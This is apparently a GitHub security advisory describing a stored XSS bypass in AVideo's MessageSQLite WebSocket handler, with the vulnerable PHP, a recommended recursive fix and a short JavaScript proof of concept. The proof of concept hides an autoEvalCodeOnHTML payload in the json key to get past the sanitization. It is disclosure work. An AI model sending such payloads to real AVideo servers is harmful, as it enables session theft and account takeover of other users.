# [H] WWBN AVideo: Stored XSS via autoEvalCodeOnHTML Bypass in MessageSQLite WebSocket Handler (CVE-2026-43874 Bypass)

## Summary
Severity: High
Advisory: GHSA-2fhx-q92v-5fhv
CVE: CVE-2026-49279
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-2fhx-q92v-5fhv
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
# AVideo: Stored XSS via `autoEvalCodeOnHTML` in MessageSQLite WebSocket Handler

## Summary

AVideo has a stored XSS vulnerability in the WebSocket messaging system. The `MessageSQLite.php` handler only strips `autoEvalCodeOnHTML` from `$json['msg']`, but `msgToResourceId()` reads from `$msg['json']` with higher priority. An attacker can place the XSS payload in the `json` key instead of `msg`, bypassing the sanitization entirely.


## Affected Versions

AVideo <= latest

## Vulnerability Details

### Root Cause: Shallow sanitization only covers `$json['msg']`

`plugin/YPTSocket/MessageSQLite.php` lines 268-271 — the incomplete fix:

```php
if (empty($msgObj->isCommandLineInterface) && ($msgObj->sentFrom ?? '') !== 'php') {
    if (is_array($json['msg'] ?? null)) {
        unset($json['msg']['autoEvalCodeOnHTML']);  // Only strips from $json['msg']
    }
}
```

`plugin/YPTSocket/MessageSQLite.php` lines 361-367 — the bypass via `msgToResourceId()`:

```php
if (!empty($msg['json'])) {
    $obj['msg'] = $msg['json'];       // $msg['json']['autoEvalCodeOnHTML'] is NEVER stripped
} else if (!empty($msg['msg'])) {
    $obj['msg'] = $msg['msg'];        // Only this path was sanitized
} else {
    $obj['msg'] = $msg;
}
```

Compare with the correctly patched `Message.php` (lines 254-256):

```php
$json = removeAutoEvalCodeOnHTMLRecursive($json);  // Strips from ALL nested paths
```

And `MessageSQLiteV2.php` (lines 302-303):

```php
$json = removeAutoEvalCodeOnHTMLRecursive($json);  // Same recursive fix
```

`MessageSQLite.php` does not call `removeAutoEvalCodeOnHTMLRecursive()` at all.

### Attack Chain

- Attacker sends a WebSocket message with `autoEvalCodeOnHTML` in the `json` key instead of `msg`
- The fix at line 268-271 only checks `$json['msg']` — the `json` key is untouched
- `msgToResourceId()` reads `$msg['json']` first (line 361) because `!empty($msg['json'])` is true
- The payload is delivered to the victim's WebSocket client and evaluated via `autoEvalCodeOnHTML`

## Proof of Concept

```javascript
// Connect to AVideo WebSocket as authenticated user
const ws = new WebSocket('wss://TARGET/plugin/YPTSocket/server.php?token=USER_TOKEN');

ws.onopen = () => {
  ws.send(JSON.stringify({
    msg: "Hello",                               // sanitized path — decoy
    json: {autoEvalCodeOnHTML: "alert('XSS')"},  // unsanitized path — payload
    to_users_id: VICTIM_USER_ID,
    resourceId: RESOURCE_ID
  }));
};
// Victim's client evaluates alert('XSS') via autoEvalCodeOnHTML mechanism
```

## Impact

An authenticated attacker can:

- Execute arbitrary JavaScript in any connected user's browser session via the WebSocket messaging system
- Steal session cookies and authentication tokens
- Perform account takeover via session hijacking
- Chain with CSRF to execute admin actions on behalf of the victim

The vulnerability affects the default SQLite WebSocket backend configuration.

## Suggested Remediation

Apply `removeAutoEvalCodeOnHTMLRecursive()` in `MessageSQLite.php`, consistent with `Message.php` and `MessageSQLiteV2.php`:

```php
// Before (vulnerable — shallow strip):
if (is_array($json['msg'] ?? null)) {
    unset($json['msg']['autoEvalCodeOnHTML']);
}

// After (fixed — recursive strip):
$json = removeAutoEvalCodeOnHTMLRecursive($json);
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-2fhx-q92v-5fhv
- https://github.com/WWBN/AVideo/commit/3e0b3ce2bfa766183ff0ae227439394db57b1a23
- https://github.com/WWBN/AVideo
